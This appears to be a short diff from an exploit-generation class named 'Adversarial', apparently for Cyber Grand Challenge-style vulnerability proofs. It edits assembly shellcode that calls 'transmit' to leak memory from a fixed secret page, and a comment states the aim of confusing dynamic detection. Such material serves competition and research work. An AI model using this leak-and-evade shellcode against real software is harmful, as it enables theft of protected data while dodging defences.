@@ -118,8 +118,7 @@ class Adversarial(object):
         ;  - confuse dynamic detection of type2
         ; int transmit(int fd, const void *buf, size_t count, size_t *tx_bytes) [2]
         mov ecx,  0x4347c000
-        xor edx, edx
-        mov dl, 4
+        mov edx, 0x10000
         mov esi, {tmp1}
         xor eax, eax
         mov al, 0x2
